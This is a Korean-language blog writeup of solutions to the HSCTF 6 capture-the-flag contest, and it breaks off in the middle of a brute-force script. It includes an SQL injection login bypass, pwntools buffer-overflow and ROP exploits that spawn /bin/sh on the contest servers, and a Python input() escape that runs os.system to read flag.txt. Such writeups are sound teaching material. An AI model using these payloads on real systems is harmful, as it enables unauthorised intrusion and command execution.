+++
title = "HSCTF 6 Writeup"
subtitle = ""

# Add a summary to display on homepage (optional).
summary = "HSCTF 6 Writeup"

date = "2019-06-05T18:56:10+09:00"
publishDate = "2019-06-05T18:56:10+09:00"
expiryDate = ""

# Authors. Comma separated list, e.g. `["Bob Smith", "David Jones"]`.
authors = []

# Tags and categories
# For example, use `tags = []` for no tags, or the form `tags = ["A Tag", "Another Tag"]` for one or more tags.
tags = ["HSCTF", "CTF", "2019", "RSA", "Git", 'SQL', 'Brute Force', 'rand', 'strings', 'signature']
categories = ["CTF"]
keywords = ["HSCTF", "CTF", "2019"]

# Projects (optional).
#   Associate this post with one or more of your projects.
#   Simply enter your project's folder or file name without extension.
#   E.g. `projects = ["deep-learning"]` references 
#   `content/project/deep-learning/index.md`.
#   Otherwise, set `projects = []`.
# projects = ["internal-project"]

# Featured image
# To use, add an image named `featured.jpg/png` to your page's folder. 
[image]
  # Caption (optional)
  caption = ""

  # Focal point (optional)
  # Options: Smart, Center, TopLeft, Top, TopRight, Left, Right, BottomLeft, Bottom, BottomRight
  focal_point = ""

draft = false
+++

Hsctf 6 Writeup

# Index
1. [Web](#web-index)  
1.1 [Inspect Me](#inspect-me-index)  
1.2 [Agent Keith](#agent-keith-index) `#User-Agent`  
1.3 [S-Q-L](#s-q-l-index)  
2. [Cryptography](#cryptography-index)  
2.1 [Reverse Search Algorithm](#reverse-search-algorithm-index)  
2.2 [Super Secure System](#super-secure-system-index)  
3. [Binary Exploitation](#binary-exploitation-index)  
3.1 [Return to Sender](#return-to-sender-index)  
3.2 [Combo Chain Lite](#combo-chain-lite-index)  
4. [Miscellaneous](#miscellaneous-index)  
4.1 [A Simple Conversation](#a-simple-conversation-index)  
4.2 [Admin Pass](#admin-pass-index) `#git`, `#log`, `#history`  
5. [Reversal](#reversal-index)  
5.1 [A Byte](#a-byte-index) `#xor`  
5.2 [License](#license-index) `#brute force`  
5.3 [Tux Talk Show 2019](#tux-talk-show-2019-index) `#rand`  
6. [Forensics](#forensics-index)  
6.1 [Chicken Crossing](#chicken-crossing-index) `#strings`  
6.2 [Cool Image](#cool-image-index) `#signature`  
6.3 [Cool Image 2](#cool-image-2-index) `#signature`, `#header`  
6.4 [Slap](#slap-index) `#strings`  

# [Web](#index)
## [Inspect Me](#index)
```diff
Inspect Me
50
Written by: dwang

Keith's little brother messed up some things...

https://inspect-me.web.chal.hsctf.com

Note: There are 3 parts to the flag!
```
페이지 소스 보기를 하면
{{< highlight html "linenos=table" >}}
<!doctype html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
        <title>inspect-me</title>
        <link rel="stylesheet" href="style.css">
    </head>
    <body>
        <main>
            <p>Keith was working on his CTF problem, but his little brother accidently moved the flag around. Can you help Keith find the flag?</p>
            <!-- The first part of the flag is: hsctf{that_was_ -->
        </main>
        <script src="script.js"></script>
    </body>
</html>
{{< /highlight >}}
12번째 줄에 주석처리로 플래그가 있다. `hsctf{that_was_`  
그리고 `style.css`와 `script.js`에 각각 두 번째, 세 번째 플래그가 나눠져 있다.  
flag : `hsctf{that_was_pretty_easy_right}`
## [Agent Keith](#index)
```diff
Agent Keith
100
Written by: dwang

Keith was looking at some old browsers and made a site to hold his flag.

https://agent-keith.web.chal.hsctf.com
```
사이트에 접속해보면
```diff
If you're not Keith, you won't get the flag!
Your agent is: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36

Flag: Access Denied
```
Keith만 flag를 얻을 수 있다면서 나의 `User-Agent`를 보여준다.
페이지 소스를 보면
```html
<!doctype html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
        <title>agent-keith</title>
        <link rel="stylesheet" href="http://localhost:8002/static/style.css">
    </head>
    <body>
        <main>
            <h2>If you're not Keith, you won't get the flag!</h2>
            <p><b>Your agent is:</b> Keith</p>
            <p><b>Flag:</b> Access Denied</p>
            <!-- DEBUG (remove me!!): NCSA_Mosaic/2.0 (Windows 3.1) -->
        </main>
    </body>
</html>
```
`NCSA_Mosaic/2.0 (Windows 3.1)` 개발자가 디버깅 할 시 남겨놨던 주석이 보인다.
```python
import requests

headers = {
            'user-agent': 'NCSA_Mosaic/2.0 (Windows 3.1)'
            }
url = 'https://agent-keith.web.chal.hsctf.com/'
res = requests.get(url, headers=headers)
text = res.text
print(text)
```
파이썬 코드를 이용해서 풀었습니다.  
flag : `hsctf{wow_you_are_agent_keith_now}`
## [S-Q-L](#index)
```diff
S-Q-L
100
Written by: dwang

Keith keeps trying to keep his flag safe. This time, he used a database and some PHP.

https://s-q-l.web.chal.hsctf.com/
```
로그인 페이지에 SQL Injection하는 문제입니다.  
공격 쿼리 : `admin' or 1=1;#`
```
Hello Keith!
The flag is hsctf{mysql_real_escape_string}
```

# [Cryptography](#index)  
## [Reverse Search Algorithm](#index)
```diff
Reverse Search Algorithm
100
Written by: Tux

Reverse Search Algorithm
WWPHSN students, gotta get these points to boost your grade.

n = 561985565696052620466091856149686893774419565625295691069663316673425409620917583731032457879432617979438142137
e = 65537
c = 328055279212128616898203809983039708787490384650725890748576927208883055381430000756624369636820903704775835777
```
```python
import gmpy2

n = 561985565696052620466091856149686893774419565625295691069663316673425409620917583731032457879432617979438142137
e = 65537
c = 328055279212128616898203809983039708787490384650725890748576927208883055381430000756624369636820903704775835777

p = 29
q = 19378812610208711050554891591368513578428260883630885898953907471497427917962675301070084754463193723428901453
phi = (p-1) * (q-1)

d = gmpy2.invert(e,phi)

print hex(gmpy2.powmod(c,d,n))[2:].decode('hex')
```
flag : `hsctf{y3s_rsa_1s_s0lved_10823704961253}`
## [Super Secure System](#index)
```python
r = remote('crypto.hsctf.com', 8111)

r.recvuntil(': ')
secret = r.recvline()[:-1]

#context.log_level = 'debug'

s = 'hsctf{h0w_d3d_y3u_de3cryP4_th3_s1p3R_s3cuR3_m355a9e?}'
p = log.progress('')
for c in '?_{}'+string.ascii_lowercase+string.digits+string.ascii_uppercase:
    p.status(c)
    r.sendlineafter(': ', s+c)
    r.recvuntil(': ')
    test = r.recvline()[:-1]
    length = 2 * (len(s)+1)
    if secret[:length] == test:
        print repr(secret)
        print repr(c)
        print repr(test)
        p.success(c)
        break

r.interactive()
```
# [Binary Exploitation](#index)
## [Return to Sender](#index)
```diff
Return to Sender
227
Written by: Ptomerty

Who knew the USPS could lose a letter so many times?

nc pwn.hsctf.com 1234

6/3/19 7:34 AM: Updated binary, SHA-1: 104fb76c3318fb44130c4a8ee50ac1a2f52d4082 return-to-sender
```
바이너리와 C언어 소스 코드를 제공하고 있습니다.
{{< highlight c "linenos=true" >}}
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

void win() {
    system("/bin/sh");
}

void vuln() {
    char dest[8];
    printf("Where are you sending your mail to today? ");
    gets(dest);
    printf("Alright, to %s it goes!\n", dest);
}

int main() {
    setbuf(stdout, NULL);
    gid_t gid = getegid();
    setresgid(gid,gid,gid);
    vuln();
    return 0;
}
{{< /highlight >}}
함수 win()으로 리턴 주소를 덮는 문제입니다. 취약한 함수는 12번째 줄의 gets()입니다. 리턴 주소까지의 거리(길이)는 얼마나 될지 디버깅을 통해 확인합니다.
{{< highlight c "linenos=true" >}}
int vuln()
{
  char s; // [sp+8h] [bp-10h]@1

  printf("Where are you sending your mail to today? ");
  gets(&s);
  return printf("Alright, to %s it goes!\n", &s);
}
{{< /highlight >}}
3번째 줄을 보면 지역변수 s는 bp-0x10에 위치하고 있습니다. 따라서, sfp가 4바이트를 차지하므로 리턴 주소까지 거리는 0x14입니다.

```c
+-------------+--------------+--------+--------+
|   dest[8]   |   dummy[8]   | sfp[4] | ret[4] |
+-------------+--------------+--------+--------+
```
```python
payload = ''
payload += 'a' * 0x14
```
그리고 리턴 주소는 win()의 주소가 들어갑니다.
```python
e = ELF('./return-to-sender')

payload = ''
payload += 'a' * 0x14
payload += e.sym.win
```
```python
e = ELF('./return-to-sender')
r = remote('pwn.hsctf.com', 1234)

payload = ''
payload += 'a' * 0x14
payload += e.sym.win

r.sendlineafter('? ', payload)
r.interactive()
```
```shell
Alright, to aaaaaaaaaaaaaaaaaaaa\xb6\x91\x0 it goes!
$ cat flag
hsctf{fedex_dont_fail_me_now}
```
## [Combo Chain Lite](#index)
```diff
Combo Chain Lite
400
Written by: Ptomerty

Training wheels!

nc pwn.hsctf.com 3131
```
바이너리와 소스코드를 제공해줍니다.
{{< highlight c "linenos=true" >}}
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

void vuln() {
        char dest[8];
        printf("Here's your free computer: %p\n", system);
        printf("Dude you hear about that new game called /bin/sh");
        printf("? Enter the right combo for some COMBO CARNAGE!: ");
        gets(dest);
}

int main() {
        setbuf(stdout, NULL);
        gid_t gid = getegid();
        setresgid(gid,gid,gid);
        vuln();
        return 0;
}
{{< /highlight >}}
10번째 줄의 gets()에서 BOF 취약점이 발생합니다.
지역변수 dest부터 리턴 주소까지의 거리를 바이너리를 통해 확인합니다.
```c
int vuln()
{
  char v1; // [sp+8h] [bp-8h]@1

  printf("Here's your free computer: %p\n", &system);
  printf("Dude you hear about that new game called /bin/sh");
  printf("? Enter the right combo for some COMBO CARNAGE!: ");
  return gets(&v1);
}
```
3번째 줄에 지역변수 v1은 bp-8에 위치하므로 리턴 주소까지의 거리는 sfp 8 바이트를 더해서 0x10입니다.
```c
+---------+--------+--------+
| dest[8] | sfp[8] | ret[8] |
+---------+--------+--------+
```
다음으로 리턴 주소에 무엇을 넣을지 정해야합니다. 소스코드 7번째 줄에 보이듯이 system의 주소를 일부로 보여주고 있었습니다. 다음은 nc로 접속했을 때입니다.
```shell
# nc pwn.hsctf.com 3131
Here's your free computer: 0x7f8c5880f390
Dude you hear about that new game called /bin/sh? Enter the right combo for some COMBO CARNAGE!:
```
파이썬 코딩으로 system 주소를 파싱하여 가져옵니다.
```python
r.recvuntil(': ')
system = int(r.recvline(), 16)
```
그리고 `/bin/sh`를 system() 함수에 매개변수로 넘겨준다. 문자열은 소스코드 8번째 줄에 나와있다.
```python
e = ELF('./combo-chain-lite')
binsh = next(e.search('/bin/sh'))
```
`/bin/sh`를 매개변수로 전달하려고보니.. 이번 문제는 ELF64 바이너리였다.
```markup
[*] '/mnt/hgfs/shared/hsctf/combo-chain-lite'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
함수 호출 규약 fastcall에 따라 첫 번재 매개변수는 rdi에 넣어줘야 합니다.
가젯을 이용합니다.
```python
rop = ROP(e)
payload += 'a' * 0x10
payload += p64(rop.rdi.address)
payload += p64(binsh)
payload += p64(system)
```
```shell
$ cat flag
hsctf{wheeeeeee_that_was_fun}
```
# [Miscellaneous](#index)
## [A Simple Conversation](#index)
```diff
A Simple Conversation
178
Miscellaneous cppio
Written by: cppio

Someone on the internet wants to talk to you. Can you find out what they want?

nc misc.hsctf.com 9001
```
```shell
# nc misc.hsctf.com 9001
Hello!
Hey, can you help me out real quick.
I need to know your age.
What's your age?
>
```
20살 나이를 적으면
```shell
Hello!
Hey, can you help me out real quick.
I need to know your age.
What's your age?
> 20
Wow!
Sometimes I wish I was 20
Well, it was nice meeting you, 20-year-old.
Goodbye!
```
입력한 `20`을 그대로 출력해준다.  
`talk.py`도 제공해주고 있으므로 확인해보자.
```python
#!/usr/bin/env python3
from time import sleep

print("Hello!")

sleep(1)

print("Hey, can you help me out real quick.")

sleep(1)

print("I need to know your age.")

sleep(1)

print("What's your age?")

age = input("> ")

sleep(1)

print("Wow!")

sleep(1)

print("Sometimes I wish I was %s" % age)

sleep(1)

print("Well, it was nice meeting you, %s-year-old." % age)

sleep(1)

print("Goodbye!")
```
python3로 돌아가고 나이를 `%s` 문자열로 출력해준다.  
호기심에 문자열 아무거나 넣어보았다.
```shell
# nc misc.hsctf.com 9001
Hello!
Hey, can you help me out real quick.
I need to know your age.
What's your age?
> lakwjefoiawejf
Traceback (most recent call last):
  File "talk.py", line 18, in <module>
    age = input("> ")
  File "<string>", line 1, in <module>
NameError: name 'lakwjefoiawejf' is not defined
```
뚜둥! `NameError`가 뜨는 것으로보아 선언되어있는 변수이름을 알면 뭐든 출력할 수 있을 것 같다.
`talk.py` 안에 flag가 있는거 같진 않아보인다.
`python jailbreak`를 검색해보면 `dir()`에 대한 글을 어렵지 않게 볼 수 있다.
해당 명령으로 선언되어있는 변수를 확인할 수 있는 듯 하다.
```shell
Hello!
Hey, can you help me out real quick.
I need to know your age.
What's your age?
> dir()
Wow!
Sometimes I wish I was ['__builtins__', '__doc__', '__file__', '__name__', '__package__', 'sleep']
Well, it was nice meeting you, ['__builtins__', '__doc__', '__file__', '__name__', '__package__', 'sleep']-year-old.
Goodbye!
```
다양한 녀석들이 나오는데 이 중에 `__builtins__`에 주목했다.
```shell
Hello!
Hey, can you help me out real quick.
I need to know your age.
What's your age?
> dir(__builtins__)
Wow!
Sometimes I wish I was ['ArithmeticError', 'AssertionError', 'AttributeError', 'BaseException', 'BufferError', 'BytesWarning', 'DeprecationWarning', 'EOFError', 'Ellipsis', 'EnvironmentError', 'Exception', 'False', 'FloatingPointError', 'FutureWarning', 'GeneratorExit', 'IOError', 'ImportError', 'ImportWarning', 'IndentationError', 'IndexError', 'KeyError', 'KeyboardInterrupt', 'LookupError', 'MemoryError', 'NameError', 'None', 'NotImplemented', 'NotImplementedError', 'OSError', 'OverflowError', 'PendingDeprecationWarning', 'ReferenceError', 'RuntimeError', 'RuntimeWarning', 'StandardError', 'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError', 'SystemExit', 'TabError', 'True', 'TypeError', 'UnboundLocalError', 'UnicodeDecodeError', 'UnicodeEncodeError', 'UnicodeError', 'UnicodeTranslateError', 'UnicodeWarning', 'UserWarning', 'ValueError', 'Warning', 'ZeroDivisionError', '__debug__', '__doc__', '__import__', '__name__', '__package__', 'abs', 'all', 'any', 'apply', 'basestring', 'bin', 'bool', 'buffer', 'bytearray', 'bytes', 'callable', 'chr', 'classmethod', 'cmp', 'coerce', 'compile', 'complex', 'copyright', 'credits', 'delattr', 'dict', 'dir', 'divmod', 'enumerate', 'eval', 'execfile', 'exit', 'file', 'filter', 'float', 'format', 'frozenset', 'getattr', 'globals', 'hasattr', 'hash', 'help', 'hex', 'id', 'input', 'int', 'intern', 'isinstance', 'issubclass', 'iter', 'len', 'license', 'list', 'locals', 'long', 'map', 'max', 'memoryview', 'min', 'next', 'object', 'oct', 'open', 'ord', 'pow', 'print', 'property', 'quit', 'range', 'raw_input', 'reduce', 'reload', 'repr', 'reversed', 'round', 'set', 'setattr', 'slice', 'sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'unichr', 'unicode', 'vars', 'xrange', 'zip']
Well, it was nice meeting you, ['ArithmeticError', 'AssertionError', 'AttributeError', 'BaseException', 'BufferError', 'BytesWarning', 'DeprecationWarning', 'EOFError', 'Ellipsis', 'EnvironmentError', 'Exception', 'False', 'FloatingPointError', 'FutureWarning', 'GeneratorExit', 'IOError', 'ImportError', 'ImportWarning', 'IndentationError', 'IndexError', 'KeyError', 'KeyboardInterrupt', 'LookupError', 'MemoryError', 'NameError', 'None', 'NotImplemented', 'NotImplementedError', 'OSError', 'OverflowError', 'PendingDeprecationWarning', 'ReferenceError', 'RuntimeError', 'RuntimeWarning', 'StandardError', 'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError', 'SystemExit', 'TabError', 'True', 'TypeError', 'UnboundLocalError', 'UnicodeDecodeError', 'UnicodeEncodeError', 'UnicodeError', 'UnicodeTranslateError', 'UnicodeWarning', 'UserWarning', 'ValueError', 'Warning', 'ZeroDivisionError', '__debug__', '__doc__', '__import__', '__name__', '__package__', 'abs', 'all', 'any', 'apply', 'basestring', 'bin', 'bool', 'buffer', 'bytearray', 'bytes', 'callable', 'chr', 'classmethod', 'cmp', 'coerce', 'compile', 'complex', 'copyright', 'credits', 'delattr', 'dict', 'dir', 'divmod', 'enumerate', 'eval', 'execfile', 'exit', 'file', 'filter', 'float', 'format', 'frozenset', 'getattr', 'globals', 'hasattr', 'hash', 'help', 'hex', 'id', 'input', 'int', 'intern', 'isinstance', 'issubclass', 'iter', 'len', 'license', 'list', 'locals', 'long', 'map', 'max', 'memoryview', 'min', 'next', 'object', 'oct', 'open', 'ord', 'pow', 'print', 'property', 'quit', 'range', 'raw_input', 'reduce', 'reload', 'repr', 'reversed', 'round', 'set', 'setattr', 'slice', 'sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'unichr', 'unicode', 'vars', 'xrange', 'zip']-year-old.
Goodbye!
```
우리가 사용할 수 있는 것들 중에 `__import__`가 눈에 띈다.
`os` 모듈을 임포트한 다음에 system 함수로 디렉토리를 확인해보자.
```shell
Hello!
Hey, can you help me out real quick.
I need to know your age.
What's your age?
> __import__('os').system('ls')
bin
boot
dev
etc
flag.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
talk.py
tmp
usr
var
Wow!
Sometimes I wish I was 0
Well, it was nice meeting you, 0-year-old.
Goodbye!
```
`flag.txt`가 확인됬다.
플래그는 다음과 같다.
```shell
Hello!
Hey, can you help me out real quick.
I need to know your age.
What's your age?
> __import__('os').system('cat flag.txt')
hsctf{plz_u5e_pyth0n_3}
Wow!
Sometimes I wish I was 0
Well, it was nice meeting you, 0-year-old.
Goodbye!
```
또는 파일이름을 모르는 상태에서는 불가능하지만, 안다는 가정 하에 빌트인 함수인 `execfile`도 가능하겠다 싶었다.
```shell
Hello!
Hey, can you help me out real quick.
I need to know your age.
What's your age?
> execfile('flag.txt')
Traceback (most recent call last):
  File "talk.py", line 18, in <module>
    age = input("> ")
  File "<string>", line 1, in <module>
  File "flag.txt", line 1
    hsctf{plz_u5e_pyth0n_3}
         ^
SyntaxError: invalid syntax
```
`execfile`은 line 1에서 에러가 나면 line 2부터는 내용을 읽지 않는다는 단점이 있긴 하다.

## [Admin Pass](#index)
`#git`, `#log`, `#history`
```diff
Admin Pass
142
Written by: Weastie

Hey guys, found a super cool website at http://misc.hsctf.com:8001!

Edit: If the site is blocked by school filters, try

http://misc.hsctf.com or http://misc.hsctf.com:8080; both will work!
```
멋진 웹사이트를 발견했단다 들어가보자.

![coolWebsite](https://user-images.githubusercontent.com/19237789/59142495-3ffec000-89fa-11e9-8626-42b51fb6f710.png)

{{< highlight html "linenos=true" >}}
<!DOCTYPE html>

<html>
	<head>
		<!-- IMPORTANT NOTE: THE FLAG IS NOT hsctf{literally_not_the_flag} -->
		<title>admin password checker</title>
		<style>
			body {
				background-color: purple;
			}
[snip]
		</style>
	</head>
	<body>
		<h1> password checker </h1>
		<form method='POST'>
			<h1> pls enter password here </h1>
			<input type='text' name='password' placeholder='password' />
			<input type='submit' />
		</form>
		<hr>
		<h1> as my tribute to richard michael stallman </h1>
		<h1> here is a link to the open source github </h1>
		<marquee scrolldelay='1'>
			<a href='https://gitlab.com/WeastieWeastie/admin-password/'>https://gitlab.com/WeastieWeastie/admin-password/</a>
		</marquee>
	</body>
</html>
{{< /highlight >}}

25번째 줄을 보면 `gitlab.com/WeastieWeastie/admin-password/` 링크가 있다.

![gitlab](https://user-images.githubusercontent.com/19237789/59142534-b4396380-89fa-11e9-9251-0b09bbc1d00a.png)

40개의 Commit이 보이고 `index.php`가 보인다.

git은 코드 형상관리를 해주는 도구로써 코드 수정한 기록을 볼 수 있다.
먼저 `clone`을 해온 뒤 `log`를 본다.

```shell
# git clone https://gitlab.com/WeastieWeastie/admin-password.git
# cd admin-password
# git log
commit 35e9ff76141be4dfbfb302a6849e7fd5222fdb27 (HEAD, origin/master, origin/HEAD, master)
Author: Weastie Weastie <ry.weast@gmail.com>
Date:   Tue May 28 22:39:55 2019 -0400

    added some lines

commit f2019b4e3a0581283ab9d79917cb2f8f3d29d3a0
Author: Weastie Weastie <ry.weast@gmail.com>
Date:   Tue May 28 22:39:49 2019 -0400

    added some lines

commit 65d12ae1990786502306063df130edfefd99152f
Author: Weastie Weastie <ry.weast@gmail.com>
Date:   Tue May 28 22:25:01 2019 -0400

    added some lines

commit 248adf9a2c36d3e979690b86cac27e772d9c1cde
Author: Weastie Weastie <ry.weast@gmail.com>
Date:   Tue May 28 22:24:29 2019 -0400

    added some lines

commit 01735386594cb9ca0558a8d216bb370d064b891c
Author: Weastie Weastie <ry.weast@gmail.com>
Date:   Tue May 28 22:23:48 2019 -0400

    added some lines
...
```
40개의 Commit 중에 flag가 있었다.
```shell
# git diff cd9101a58867eebf157e222097b317f20448e16c 08ad9151aed2f115eebd1b288823140e9c34ca0d 954f05ece6f8d686e33daabd3885ef76cd7db025 3fa5f2ad2f17bec15e4a45b747cced878b82c292 2f48a1b4b2eba922bca1e644b9a9d609cf08be77 ced3b4c6774184cddaa641a6091210a6242c889e 97223d2b79dff0227e863163163c2f6ee5f14631
diff --cc index.php
index 1ae0caf,7139a02,5cf73b3,84763ec,8c003a4,854d026..dd9a1f1
--- a/index.php
+++ b/index.php
@@@@@@@ -1,7 -1,7 -1,7 -1,7 -1,7 -1,7 +1,7 @@@@@@@
      <?php
------  if ($_GET['password']) {
----            if (md5($_GET['password']) === '6df4c2a41091d8c737db7a44e3d07fb3') {
    -           if ($_GET['password'] === 'i_love_richard_stallman_hes_so_cute_8a65926fcdcdac0b') {
     -          if ($_GET['password']) {
------                  echo 'congrats the flag is hsctf{' . $_GET['password'] . '}';
++++++  if ($_POST['password']) {
++++++          if (md5($_POST['password']) === '6df4c2a41091d8c737db7a44e3d07fb3') {
++++++                  echo 'congrats the flag is hsctf{' . $_POST['password'] . '}';
                }
                echo 'oh hi you entered a password';
        }
@@@@@@@ -17,10 -17,9 -17,5 -15,5 -15,5 -17,5 +17,10 @@@@@@@
        </head>
        <body>
                <h1> paswrord cchekcer </h1>
  ++++          <form method='POST'>
  ++++                  <h1> pls ernter passwrd here </h1>
  ++++                  <input type='text' name='password' placeholder='password' />
 +++++                  <input type='submit'>
  ++++          </form>
        </body>
      </html>
```
flag : `hsctf{i_love_richard_stallman_hes_so_cute_8a65926fcdcdac0b}`  
소스코드 형상관리를 git을 사용하는 기업이나 개인 개발자들 중에서 이와 같은 방식으로 DB 계정을 털리기도 한다.

# [Reversal](#index)
## [A Byte](#index)
```diff
A Byte
201
Written by: ItzSomebody

Just one byte makes all the difference.

ab6582abc8979f562a7318cb1e0a7293  a-byte
```
'단 1 바이트만으로 모든게 달라진다.'라면서 a-byte라는 바이너리를 줍니다.
```shell
# file a-byte
a-byte: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=88fe0ee8aed1a070d6555c7e9866e364a40f686c, stripped
```
ELF 64-bit 바이너리입니다.
{{< highlight c "linenos=true" >}}
signed __int64 __fastcall main(int a1, char **a2, char **a3)
{
  signed __int64 result; // rax@2
  __int64 v4; // rsi@9
  signed int i; // [sp+10h] [bp-40h]@4
  char *s; // [sp+18h] [bp-38h]@3
  char s1; // [sp+20h] [bp-30h]@7
  char v8; // [sp+21h] [bp-2Fh]@7
  char v9; // [sp+22h] [bp-2Eh]@7
  char v10; // [sp+23h] [bp-2Dh]@7
  char v11; // [sp+24h] [bp-2Ch]@7
  char v12; // [sp+25h] [bp-2Bh]@7
  char v13; // [sp+26h] [bp-2Ah]@7
  char v14; // [sp+27h] [bp-29h]@7
  char v15; // [sp+28h] [bp-28h]@7
  char v16; // [sp+29h] [bp-27h]@7
  char v17; // [sp+2Ah] [bp-26h]@7
  char v18; // [sp+2Bh] [bp-25h]@7
  char v19; // [sp+2Ch] [bp-24h]@7
  char v20; // [sp+2Dh] [bp-23h]@7
  char v21; // [sp+2Eh] [bp-22h]@7
  char v22; // [sp+2Fh] [bp-21h]@7
  char v23; // [sp+30h] [bp-20h]@7
  char v24; // [sp+31h] [bp-1Fh]@7
  char v25; // [sp+32h] [bp-1Eh]@7
  char v26; // [sp+33h] [bp-1Dh]@7
  char v27; // [sp+34h] [bp-1Ch]@7
  char v28; // [sp+35h] [bp-1Bh]@7
  char v29; // [sp+36h] [bp-1Ah]@7
  char v30; // [sp+37h] [bp-19h]@7
  char v31; // [sp+38h] [bp-18h]@7
  char v32; // [sp+39h] [bp-17h]@7
  char v33; // [sp+3Ah] [bp-16h]@7
  char v34; // [sp+3Bh] [bp-15h]@7
  char v35; // [sp+3Ch] [bp-14h]@7
  char v36; // [sp+3Dh] [bp-13h]@7
  char v37; // [sp+3Eh] [bp-12h]@7
  char v38; // [sp+3Fh] [bp-11h]@7
  char v39; // [sp+40h] [bp-10h]@7
  char v40; // [sp+41h] [bp-Fh]@7
  char v41; // [sp+42h] [bp-Eh]@7
  char v42; // [sp+43h] [bp-Dh]@7
  __int64 v43; // [sp+48h] [bp-8h]@1

  v43 = *MK_FP(__FS__, 40LL);
  if ( a1 != 2 )
    goto LABEL_12;
  s = a2[1];
  if ( (unsigned int)strlen(a2[1]) != 35 )
    goto LABEL_12;
  for ( i = 0; i < 35; ++i )
    s[i] ^= 1u;
  s1 = 'i';
  v8 = 'r';
  v9 = 'b';
  v10 = 'u';
  v11 = 'g';
  v12 = 'z';
  v13 = 'v';
  v14 = '1';
  v15 = 'v';
  v16 = '^';
  v17 = 'x';
  v18 = '1';
  v19 = 't';
  v20 = '^';
  v21 = 'j';
  v22 = 'o';
  v23 = '1';
  v24 = 'v';
  v25 = '^';
  v26 = 'e';
  v27 = '5';
  v28 = '^';
  v29 = 'v';
  v30 = '@';
  v31 = '2';
  v32 = '^';
  v33 = '9';
  v34 = 'i';
  v35 = '3';
  v36 = 'c';
  v37 = '@';
  v38 = '1';
  v39 = '3';
  v40 = '8';
  v41 = '|';
  v42 = 0;
  if ( !strcmp(&s1, s) )
  {
    puts("Oof, ur too good");
    result = 0LL;
  }
  else
  {
LABEL_12:
    puts("u do not know da wae");
    result = 0xFFFFFFFFLL;
  }
  v4 = *MK_FP(__FS__, 40LL) ^ v43;
  return result;
}
{{< /highlight >}}

1. `u do not know da wae`는 실패했을 때 나오는 문구. `Oof, ur too good`는 성공했을 때 나오는 문구 (line 97,91)  
2. `./a-byte hsctf{j3rrry}` 처럼 매개변수로 flag를 넘기는 방식 (line 46)  
3. `hsctf{j3rrry4567892123456789312345}` 처럼 flag의 길이는 35 bytes (line 49)  
4. flag의 각 자리마다 1과 XOR 연산한 결과는 (line 51-52)  
5. `irbugzv1v^x1t^jo1v^e5^v@2^9i3c@138|`와 같아야 함. (line 53-88,89)  

XOR 연산은 [2회 반복하면 원래대로 된다.](https://ko.wikipedia.org/wiki/배타적_논리합#암호_키에_사용)
따라서, `irbugzv1v^x1t^jo1v^e5^v@2^9i3c@138|`의 각 자리마다 1과 XOR 연산하면 flag가 된다.
```python
s = 'irbugzv1v^x1t^jo1v^e5^v@2^9i3c@138|'
for c in s:
    print chr(ord(c) ^ 1)
```
```shell
# python a.py | tr -d '\n'
hsctf{w0w_y0u_kn0w_d4_wA3_8h2bA029}
```
## [License](#index)
```diff
License
286
Written by: ItzSomebody

Description: Keith made a cool license-checking program but he forgot the flag he used to create the key! To make matters worse, he lost the source code and stripped the binary for his license-generator program. Can you help Keith recover his flag? All he knows is:

* The license key is 4-EZF2M-7O5F4-V9P7O-EVFDP-E4VDO-O
* He put his name (in the form of 'k3ith') as the first part of the flag
* There are 3 underscores
* The flag is in the format hsctf{}
* The flag doesn't have random character sequences (you should be able to read the entire flag easily).
* The flag only contains lowercase English letters and numbers.
* The generator might produce the same keys for different inputs because Keith was too lazy to write the algorithm properly.

253afe331e889837e3941878db30b070  license
```
Keith는 라이센스 생성기를 만들었지만 라이센스 키 생성에 사용했던 flag를 까먹었다! 게다가, 소스코드도 잃어먹고 바이너리는 스트립되어 있다.
Keith의 flag를 되찾아 줄 수 있나요?
그가 알고 있는 것은:

* 라이센스 키는 `4-EZF2M-7O5F4-V9P7O-EVFDP-E4VDO-O` 이다.
* flag의 앞 부분에 그의 이름인 `k3ith`을 사용했다.
* 3개의 `언더바(_)`가 사용되었다.
* flag는 `hsctf{}` 형식을 따른다.
* flag는 랜덤한 값을 갖지 않는다. (flag 전체를 쉽게 읽을 수 있다.)
* flag는 `소문자`와 `숫자`로 이루어져 있다.
* 생성기는 서로 다른 flag에 대하여 같은 라이센스 키를 생성할 수 있다. 왜냐하면 Keith가 알고리즘을 빡세게 짜지 않았기 때문이다.

디버거로 열어보면 c++로 짠 듯하다.
다음은 실행했을 때의 모습이다.
```shell
# ./license
gimme dat string: hsctf{awefaefa_fawefa_feaewf}
generating key for: hsctf{awefaefa_fawefa_feaewf}
4-EZF2M-XI12X-12XV2-XI12X-V21X1-I2O
```
입력한 flag의 길이 29만큼 라이센스 키도 29만큼 생성된다.
```python
>>> len('hsctf{awefaefa_fawefa_feaewf}') == len('4-EZF2M-XI12X-12XV2-XI12X-V21X1-I2O'.replace('-',''))
True
```
문자 하나하나 브루트 포싱해서 키값을 알아내 보았다.
알고리즘을 빡세게 짜지 않았다.
{{< highlight python "linenos=true" >}}
    context.log_level = 'error'
    chset = ('_}'+string.ascii_lowercase+string.digits)+'?'
    flag = 'hsctf{k3ith_m4k3s_tr4sh_r3'
    goal = '4-EZF2M-7O5F4-V9P7O-EVFDP-E4VDO-O'
    # char brute force
    count = 32
    for i in range(len(goal)-len(flag)-6):
        found = False
        for c in chset:
            # start ./license
            p = process('./license')
            # append 1-char
            p.sendlineafter(': ', flag+c)
            # parsing generated license
            p.recvline()
            l = p.recvline()    # generated license
            # close the process
            p.close()
